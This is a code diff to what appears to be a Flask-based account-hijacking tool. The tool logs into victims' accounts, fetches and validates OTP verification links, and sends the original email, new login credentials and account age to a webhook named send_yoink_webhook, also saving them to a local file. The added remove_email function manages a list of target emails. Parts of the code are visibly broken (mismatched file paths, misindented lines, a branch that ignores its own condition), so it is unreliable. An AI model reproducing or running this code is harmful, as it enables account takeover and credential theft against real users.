@@ -120,16 +120,31 @@ def get_email():
         lines = file.readlines()
 
     # Check if the file is not empty
-    if lines:
-        email = lines[0]
-        # Remove the first line (top line)
-        lines = lines[1:]
-
-        # Write the remaining lines back to the file
-        with open(file_path, 'w') as file:
-            file.writelines(lines)
+        if lines:
+            email = lines[0]
     return email
+
+def remove_email(email):
+    try:
+        # Open the file in read mode and read all lines
+        with open('utils/emails.txt', 'r') as file:
+            lines = file.readlines()
+
+        # Remove any trailing newline characters and filter out the email to be removed
+        updated_lines = [line.strip() for line in lines if line.strip() != email]
+
+        # Write the updated lines back to the file
+        with open('emails.txt', 'w') as file:
+            for line in updated_lines:
+                file.write(f"{line}\n")
         
+        print(f"Email '{email}' has been removed from the file.")
+    
+    except FileNotFoundError:
+        print("The file 'emails.txt' does not exist.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
 @app.route('/login', methods=['POST'])
 def login():
     if not request.is_json:
@@ -168,8 +183,12 @@ def login():
     session, resp = tm.get_OTP_link(session, client_token, login_url)
     print(resp)
     resp = json.loads(resp)
-
-    email_verification_link = resp['_links']['verifyDeviceViaEmail']['source']
+    if 'verifyDeviceViaPhone' in resp:
+        email_verification_link = resp['_links']['verifyDeviceViaEmail']['source']
+        # If verifyDeviceViaPhone is not found, try verifyDeviceViaEmail
+    elif 'verifyDeviceViaEmail' in resp:
+        email_verification_link = resp['_links']['verifyDeviceViaEmail']['source']
+        
     session, resp = tm.send_OTP(session, email_verification_link)
     validate_otp = json.loads(resp)['_links']['validateOtp']['source']
     store_session_data(email, session, validate_otp, client_token, account_age, password)
@@ -221,6 +240,7 @@ def otp_validate():
         send_yoink_webhook(f'{email} | {_email}:{password} | {account_age}')
         with open('utils/changed.txt','a',encoding='utf-8', errors='ignore')as changed:
             changed.write(f'{_email}:{password}:{account_age}\n')
+            remove_email(_email)
     # Return the result as a JSON response
     return jsonify(resp), 200
 if __name__ == '__main__':
